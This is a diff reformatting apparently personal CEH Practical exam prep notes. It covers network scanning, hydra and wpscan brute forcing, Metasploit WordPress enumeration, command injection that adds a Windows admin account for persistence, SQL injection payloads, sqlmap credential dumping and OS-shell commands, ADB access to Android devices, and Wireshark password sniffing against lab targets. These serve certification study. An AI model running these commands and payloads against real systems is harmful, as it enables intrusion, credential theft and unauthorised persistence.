@@ -4,7 +4,7 @@ description: A set of preparation notes for CEH practical
 
 # CEH Practical Prep Notes
 
-## Scanning Networks (always do sudo su) --> To be root
+## Scanning Networks (always do sudo su) -> To be root
 
 #### Nmap scan for alive/active hosts
 
@@ -100,41 +100,51 @@ snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt con
 
 ### Password Sniffing using Wireshark&#x20;
 
-In pcap file apply the filter: `http.request.method==POST` (you will get all the post requests)&#x20;
-
-Now to capture the password click on edit in the menu bar, then near the "Find packet" section, on the "display filter" select "string", also select "Packet details" from the drop-down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
+1. In the pcap file apply the filter: `http.request.method==POST` (you will get all the post requests)&#x20;
+2. Now to capture the password click on edit in the menu bar.&#x20;
+3. Then near the "Find packet" section, on the "display filter" select "string".
+4. Also, select "Packet details" from the drop-down of "Packet list", and also change "narrow & wide" to "Narrow UTF-8 & ASCII".
+5. Then type "pwd" in the find section.
 
 ## Hacking Web Servers
 
 ### Footprinting web server Using Netcat and Telnet:&#x20;
 
+```
 nc -vv www.movies.com 80
-
 GET /HTTP/1.0
+```
 
+```
 telnet www.movies.com 80
-
 GET /HTTP/1.0
+```
 
 ### Enumerate Web server info using nmap &#x20;
 
+```
 nmap -sV --script=http-enum www.movies.com
+```
 
 ### Crack FTP credentials using nmap &#x20;
 
-nmap -p 21 10.10.10.10&#x20;
+#### Check if FTP port is open or not
 
-Check if FTP port is open or not
-
+```
+nmap -p 21 10.10.10.10
 ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
+```
 
-Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
+Desktop > CEH tools folder you will find wordlists, here you will find usernames and password files.
 
 Now in terminal type: &#x20;
 
-hydra -L /home/attacker/Desktop/CEH\_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH\_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
-
+{% code overflow="wrap" %}
+```
+hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 hydra -l user -P passlist.txt ftp://10.10.10.10
+```
+{% endcode %}
 
 ## Hacking Web Application
 
@@ -144,55 +154,93 @@ Type zaproxy in the terminal and then it will open. In the target tab put the ur
 
 ### Directory Bruteforcing&#x20;
 
+```
 gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+```
 
 ### Enumerate a Web Application using WPscan &#x20;
 
-wpscan --url http://10.10.10.10:8080/NEW --enumerate username  &#x20;
+```
+wpscan --url http://10.10.10.10:8080/NEW --enumerate username  
+```
+
+Then type msfconsole to open metasploit and use:
 
 ```
-Then type msfconsole to open metasploit. Type -  use auxiliary/scanner/http/wordpress_login_enum
- 						 show options
-						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
-						 set RHOSTS 10.10.10.10  (target ip)
-						 set RPORT 8080          (target port)
-						 set TARGETURI http://10.10.10.10:8080/
-						 set USERNAME admin
-4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
-			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
-5- Command Injection-  | net user  (Find users)
- 		       | dir C:\  (directory listing)
-                       | net user Test/Add  (Add a user)
-		       | net user Test      (Check a user)
-		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
-		       | net user Test      (Once again check to see if it has become administrator)
-Now you can do an RDP connection with the given ip and the Test account which you created.
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+set RHOSTS 10.10.10.10  (target ip)
+set RPORT 8080          (target port)
+set TARGETURI http://10.10.10.10:8080/
+set USERNAME admin
 ```
+
+Brute Force Using WPScan
+
+{% code overflow="wrap" %}
+```
+wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt
+wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the username)
+```
+{% endcode %}
+
+Add user for persistence (Command Injection):
+
+```
+net user  (Find users)
+dir C:\  (directory listing)
+net user Test/Add  (Add a user)
+net user Test      (Check a user)
+net localgroup Administrators Test/Add   (To convert the test account to admin)
+net user Test      (Once again check to see if it has become administrator)
+```
+
+Now you can do an RDP connection with the given ip and the Test account which you created.
 
 ## SQL Injections
 
+{% code overflow="wrap" %}
 ```
-1- Auth Bypass-  hi'OR 1=1 --
-2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
-3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
-Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
+1- Auth Bypass:  
+hi'OR 1=1 --
+
+2- Insert new details if sql injection found in login page in username tab enter: 
+blah';insert into login values('john','apple123');--
+
+3- Exploit a Blind SQL Injection: 
+In the website profile, do inspect element and in the console tab write -  
+document.cookie
+Then copy the cookie value that was presented after this command. 
+Then go to terminal and type this command:
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
-4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
-5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
-6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
-6.1 In the shell type-   TASKLIST  (to view the tasks)
+
+4- Command to check tables of database retrieved:  
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+
+5- Select the table you want to dump:  
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+
+6- For OS shell this is the command:   
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+
+6.1 In the shell type:
+TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
 ```
+{% endcode %}
 
 ## Android
 
+{% code overflow="wrap" %}
 ```
 1- nmap ip -sV -p 5555    (Scan for adb port)
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
 ```
+{% endcode %}
 
 ## Wireshark
 
